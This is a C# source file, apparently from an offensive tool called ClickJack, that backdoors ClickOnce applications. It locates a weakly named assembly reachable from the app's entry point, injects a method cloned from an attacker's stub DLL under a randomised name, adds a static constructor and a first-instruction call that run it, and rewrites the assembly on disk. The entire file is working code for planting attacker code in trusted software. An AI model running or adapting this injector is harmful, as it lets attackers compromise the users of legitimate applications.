using System.Xml;
using ClickJack.Extensions;
using ClickJack.Modules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System.Collections.Generic;
using ClickJack;
using Mono.Collections.Generic;
using Newtonsoft.Json.Serialization;

class InjectApp
{
    public static bool verbose = false;
    public static bool CheckInjectable(string targetApp)
    {
        var moveback = false;
        HashSet<string> files = new HashSet<string>();
        try
        {

            bool deploy;
            var entryExe = resolveEntryExe(targetApp, out deploy);
            //Load the target assembly
            if (deploy)
            {
                //Strip .deploy, and restore when done
                string basedir = Path.GetDirectoryName(entryExe);
                GetDeployFiles(basedir, ref files);
                ManageDeployExt(files, true);
                moveback = true;
            }

            var targetAssembly = ReadAssembly(entryExe);
            var weakassembly = AnalyzeMethod(targetAssembly.EntryPoint, targetAssembly.Name.Name, out _, out _);
            var injectable = (weakassembly != null);
            weakassembly?.Dispose();
            targetAssembly.Dispose();
            if (deploy)
                ManageDeployExt(files, false);
            return injectable;
        }
        catch (Exception e)
        {
            if (verbose)
                Download.WriteError($"Failed processing {targetApp} : {e.Message}");
            if (moveback)
                ManageDeployExt(files, false);
            return false;
        }

    }
   public static void InfectClickonceApp(string[] args)
    {
        
        //Our target stub DLL to carve the method "StubMethod" from.
        string stubPath = args.GetValue("--stub");

        //The .application file we want to backdoor
        string targetApp = args.GetValue("--app");
        bool dryrun = args.Contains("--dryrun");
        verbose = args.Contains("--verbose");
        if (targetApp == "" || !(dryrun || stubPath != "") || (dryrun && stubPath != ""))
        {
            Console.WriteLine("must specify --app and one of --dryrun or --stub");
            Environment.Exit(0);
        }

        if (dryrun)
        {
            if (CheckInjectable(targetApp))
            {
                Console.WriteLine("[+] This application is injectable!");
            }
            else
            {
                Download.WriteError("[!] This application can not be injected");
            }

            return;
        }
        
        Console.WriteLine($"[+] Looking for stub method in {stubPath}");
        var sourceAssembly = AssemblyDefinition.ReadAssembly(stubPath);

        // Find the method to copy
        var methodToCopy = sourceAssembly.MainModule
            .Types
            .SelectMany(t => t.Methods)
            .First(m => m.Name == "StubMethod");  // Replace with the actual method name

        Console.WriteLine($"[+] Found StubMethod!");
        bool deploy ;
        HashSet<string> files = new HashSet<string>();
        var entryExe = resolveEntryExe(targetApp, out deploy);
        if (deploy)
        {
            //Strip .deploy, and restore when done
            string basedir = Path.GetDirectoryName(entryExe);
            GetDeployFiles(basedir, ref files);
            ManageDeployExt(files, true);
        }
        var targetAssembly = ReadAssembly(entryExe);
        TypeDefinition? targetType;
        MethodDefinition? calledMethod;
        var firstWeakModule = AnalyzeMethod(targetAssembly.EntryPoint, targetAssembly.Name.Name, out targetType, out calledMethod);
        if (firstWeakModule == null)
        {
            Download.WriteError("[!] Unable to find a weak Method to target");
            ManageDeployExt(files, false);
            return;
        }
        try
        {
            Console.WriteLine($"[+] Targeting {entryExe} for insertion");

            Collection<TypeDefinition> col;
            if (targetType != null)
            {
                col = new Collection<TypeDefinition>();
                col.Add(targetType);
                Console.WriteLine($"[+] Adding method and static initializer into type {targetType}");
            }
            else
            {
                col = firstWeakModule.Types;
            }
            // For each type in the target assembly
            Dictionary<TypeDefinition, MethodDefinition> mapping = new Dictionary<TypeDefinition, MethodDefinition>();
            foreach (var type in col)
            {
                try
                {
                    var clonedMethod = CloneMethod(methodToCopy, firstWeakModule);

                    // Make the cloned method static
                    clonedMethod.IsStatic = true;
                    // Add the cloned method to the type
                    type.Methods.Add(clonedMethod);
                    mapping.Add(type, clonedMethod);

                    // Create a static constructor inside the type
                    var cctor = new MethodDefinition(".cctor",
                        MethodAttributes.Static | MethodAttributes.SpecialName | MethodAttributes.RTSpecialName,
                        firstWeakModule.ImportReference(typeof(void)));

                    // Generate IL for the static constructor
                    var il = cctor.Body.GetILProcessor();

                    // Call the cloned method
                    il.Append(il.Create(OpCodes.Call, clonedMethod));

                    // Add a return instruction
                    il.Append(il.Create(OpCodes.Ret));

                    // Add the static constructor to the type
                    type.Methods.Add(cctor);

                }
                catch (Exception ex)
                {
                    Download.WriteError($"[!] error occured while injecting stub {ex.Message}");
                    ManageDeployExt(files, false);
                    return;
                }
            }

            if (calledMethod != null && targetType != null)
            {
                // var clonedMethod = CloneMethod(methodToCopy, calledMethod.Module);
                // clonedMethod.IsStatic = true;
                // targetType.Methods.Add(clonedMethod);
                var clonedMethod = mapping[targetType];
                var il = calledMethod.Body.GetILProcessor();
                calledMethod.Body.Instructions.Insert(0, il.Create(OpCodes.Call, clonedMethod));
                Console.WriteLine("[+] inserted call to stub code as first instruction in referenced method");
            }

            // Save the modified assembly
            var bufferStream = new MemoryStream();
            firstWeakModule.Assembly.Write(bufferStream); // Overwrite the original assembly
            var name = firstWeakModule.FileName;
            firstWeakModule.Dispose();
            firstWeakModule = null;
            File.WriteAllBytes(name, bufferStream.ToArray());
            ManageDeployExt(files, false);

        }
        catch (Exception ex)
        {
            Download.WriteError($"[!] error occured while cloning stub {ex.Message}");
            firstWeakModule?.Dispose();
            ManageDeployExt(files, false);

        }
    }

   static AssemblyDefinition ReadAssembly(string entryExe)
   {
       Func<string, string[]> getSubdirectoriesRecursive = null;
       getSubdirectoriesRecursive = directoryPath =>
       {
           string[] subdirectories = Directory.GetDirectories(directoryPath);
           foreach (string subdirectory in subdirectories)
           {
               string[] nestedSubdirectories = getSubdirectoriesRecursive(subdirectory);
               subdirectories = subdirectories.Concat(nestedSubdirectories).ToArray();
           }
           return subdirectories;
       };
       var resolver = new DefaultAssemblyResolver();
       var dirs = getSubdirectoriesRecursive(Path.GetDirectoryName(entryExe));
       foreach (var d in dirs)
       {
           resolver.AddSearchDirectory(d);
       }
       resolver.AddSearchDirectory(Path.GetDirectoryName(entryExe));
       var param = new ReaderParameters
       {
           AssemblyResolver = resolver
       };
       return AssemblyDefinition.ReadAssembly(entryExe, param);
   }

   static void GetDeployFiles(string basepath, ref HashSet<string> files)
   {
       var curfiles = Directory.GetFiles(basepath, "*.deploy");
       foreach (var f in curfiles)
       {
           files.Add(f);
       }

       foreach (var sub in Directory.GetDirectories(basepath))
       {
           GetDeployFiles(sub, ref files);
       }
   }

   static void ManageDeployExt(HashSet<string> files, bool strip)
   {
       if (files.Count == 0)
           return;
       string name = "";
       string orig = "";
       try
       {
           foreach (string f in files)
           {
               name = Path.Combine(Path.GetDirectoryName(f), Path.GetFileNameWithoutExtension(f));
               orig = f;
               if (strip)
               {
                   File.Copy(f, name, true);
               }
               else
               {
                   File.Copy(name, f, true);
               }
           }
       }
       catch (Exception ex)
       {
            Console.WriteLine($"Failed to move {orig} -> {name}");
       }
   }

   static string? resolveEntryExe(string appManifestPath, out bool deploy)
   {
       XmlDocument appManifestXml = new XmlDocument();
       deploy = false;
       appManifestXml.Load(appManifestPath);
       XmlNode? provider = appManifestXml.GetElementsByTagName("dependentAssembly")[0];
       if (provider == null)
       {
           Download.WriteError("Unable to resolve deployment manifest path");
           return null;
       }
       var mapExtentions = appManifestXml.GetElementsByTagName("deployment")?.Item(0)
           ?.Attributes?["mapFileExtensions"]?.Value == "true";
       var manifestpath = provider.Attributes?["codebase"]?.Value?.FixPath();
       if (manifestpath == null)
           return null;
       var appParentDirectory = Directory.GetParent(appManifestPath);
       manifestpath = Path.Combine(appParentDirectory.FullName, manifestpath);
       XmlDocument deploymentManifest = new XmlDocument();
       deploymentManifest.Load(manifestpath);
       var nodes = deploymentManifest.GetElementsByTagName("commandLine");
       var entryFile = nodes?[0]?.Attributes?["file"]?.Value;
       var deploymentBaseDir = Path.GetDirectoryName(manifestpath);
       if (entryFile != null)
       {
           var file = Path.Join(deploymentBaseDir, entryFile.FixPath());
           if (mapExtentions)
           {
               deploy = true;
           }

           return File.Exists((deploy) ? $"{file}.deploy" : file) ? file : null;
       }

       return null;
   }

    //    static ModuleDefinition? AnalyzeMethod(MethodDefinition method, string indent, string rootFile)
    // {
    //     foreach (var instruction in method.Body.Instructions)
    //     {
    //         if (instruction.OpCode == OpCodes.Call || instruction.OpCode == OpCodes.Callvirt)
    //         {
    //             var calledMethod = instruction.Operand as MethodReference;
    //             if (calledMethod != null)
    //             {
    //                 //Need to see how / if this can get the files with .deploy
    //                 var calledMethodDefinition = calledMethod.Resolve();
    //                 if (calledMethodDefinition != null)
    //                 {
    //                     var assemblyNameReference = calledMethodDefinition.Module.Assembly.Name;
    //                     var fullName = assemblyNameReference.FullName;
    //                     if (fullName.Contains("PublicKeyToken=null")
    //                         && !fullName.Contains(rootFile))
    //                     {
    //                         // Found a non-strongly named assembly
    //                         return calledMethodDefinition.Module;
    //                     }
    //
    //                     Console.WriteLine($"{indent}{calledMethod.FullName} (Assembly: {assemblyNameReference})");
    //
    //                     if (calledMethodDefinition.HasBody)
    //                     {
    //                         var result = AnalyzeMethod(calledMethodDefinition, indent + "  ", rootFile);
    //                         if (result != null)
    //                         {
    //                             // Propagate the result up the call stack
    //                             return result;
    //                         }
    //                     }
    //                 }
    //             }
    //         }
    //     }
    //
    //     // No non-strongly named assemblies were found in this method
    //     return null;
    // }
    
    static ModuleDefinition? AnalyzeMethod(MethodDefinition method, string rootFile, out TypeDefinition? targetType, out MethodDefinition? calledMethodDefinition)
    {
        var methods = new Stack<(MethodDefinition method, string indent, int depth)>();
        methods.Push((method, "", 1));
        targetType = null;
        calledMethodDefinition = null;
        while (methods.Count > 0)
        {
            var (currentMethod, indent, depth) = methods.Pop();

            foreach (var instruction in currentMethod.Body.Instructions)
            {
                if (instruction.OpCode == OpCodes.Call || instruction.OpCode == OpCodes.Callvirt)
                {
                    var calledMethod = instruction.Operand as MethodReference;
                    if (calledMethod != null)
                    {
                        //Need to see how / if this can get the files with .deploy
                        calledMethodDefinition = null;
                        try
                        {
                            calledMethodDefinition = calledMethod.Resolve();
                        }
                        catch (Mono.Cecil.AssemblyResolutionException ex)
                        {
                            if(verbose)
                                Download.WriteError($"{indent}{ex.Message}, skipping it");
                            continue;
                        }

                        if (calledMethodDefinition != null)
                        {
                            var assemblyNameReference = calledMethodDefinition.Module.Assembly.Name;
                            var fullName = assemblyNameReference.FullName;
                            if (fullName.Contains("PublicKeyToken=null")
                                && method.Module != calledMethodDefinition.Module)
                            {
                                // Found a non-strongly named assembly
                                var declaringType = calledMethod.DeclaringType;
                                var typeDefinition = declaringType.Resolve();
                                var typeassembly = typeDefinition.Module.Assembly;
                                if (typeDefinition != null) // If we can't resolve this we'll infect every type in the module
                                {
                                    targetType = typeDefinition;
                                }
                                Console.WriteLine($"[+] Found Method called in weak assembly {calledMethod}");
                                return calledMethodDefinition.Module;
                            }

                            if (verbose)
                                Console.WriteLine($"{indent}{calledMethod.FullName} (Assembly: {assemblyNameReference})");

                            if (calledMethodDefinition.HasBody && depth <= 5)
                            {
                                methods.Push((calledMethodDefinition, indent + "  ", depth+1));
                            }
                            
                            
                        }
                    }
                }
            }
        }

        // No non-strongly named assemblies were found in this method
        return null;
    }

    //#thanks chatgpt
    public static string GenerateRandomMethodName()
    {
        string[] vowels = { "a", "e", "i", "o", "u" };
        string[] consonants = { "b", "c", "d", "f", "g", "h", "j", "k", "l", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "y", "z" };
        Random random = new Random();

        int nameLength = random.Next(3, 8);  // Random length between 3 and 7 characters
        bool isVowelStart = random.Next(0, 2) == 0;  // Randomly decide if the name starts with a vowel or consonant
        string methodName = string.Empty;

        for (int i = 0; i < nameLength; i++)
        {
            string character;
            if (i == 0 && isVowelStart)
            {
                character = vowels[random.Next(vowels.Length)];
            }
            else
            {
                character = consonants[random.Next(consonants.Length)];
            }
            methodName += character;
        }

        return methodName;
    }
    
    static bool IsAssemblyStronglyNamed(AssemblyDefinition assembly)
    {
        return assembly.Name.HasPublicKey;
    }
    
    public static MethodDefinition CloneMethod(MethodDefinition sourceMethod, ModuleDefinition targetModule)
    {
        var methodname = GenerateRandomMethodName();
        // Create a new method with the same name, attributes, and calling convention as the source method
        var targetMethod = new MethodDefinition(methodname, sourceMethod.Attributes, targetModule.ImportReference(sourceMethod.ReturnType));

        // Copy the parameters from the source method
        foreach (var parameter in sourceMethod.Parameters)
        {
            targetMethod.Parameters.Add(new ParameterDefinition(targetModule.ImportReference(parameter.ParameterType)));
        }

        // Copy the method body from the source method
        if (sourceMethod.HasBody)
        {
            var il = targetMethod.Body.GetILProcessor();

            foreach (var variable in sourceMethod.Body.Variables)
            {
                targetMethod.Body.Variables.Add(new VariableDefinition(targetModule.ImportReference(variable.VariableType)));
            }

            foreach (var instruction in sourceMethod.Body.Instructions)
            {
                // Replace the instruction operand with an imported reference if it's a member reference
                if (instruction.Operand is MethodReference methodReference)
                {
                    instruction.Operand = targetModule.ImportReference(methodReference);
                }
                else if (instruction.Operand is FieldReference fieldReference)
                {
                    instruction.Operand = targetModule.ImportReference(fieldReference);
                }
                else if (instruction.Operand is TypeReference typeReference)
                {
                    instruction.Operand = targetModule.ImportReference(typeReference);
                }

                il.Append(instruction);
            }

            foreach (var handler in sourceMethod.Body.ExceptionHandlers)
            {
                targetMethod.Body.ExceptionHandlers.Add(new ExceptionHandler(handler.HandlerType)
                {
                    CatchType = handler.CatchType != null ? targetModule.ImportReference(handler.CatchType) : null,
                    TryStart = targetMethod.Body.Instructions[handler.TryStart.Offset],
                    TryEnd = targetMethod.Body.Instructions[handler.TryEnd.Offset],
                    HandlerStart = targetMethod.Body.Instructions[handler.HandlerStart.Offset],
                    HandlerEnd = targetMethod.Body.Instructions[handler.HandlerEnd.Offset],
                });
            }
        }

        return targetMethod;
    }
}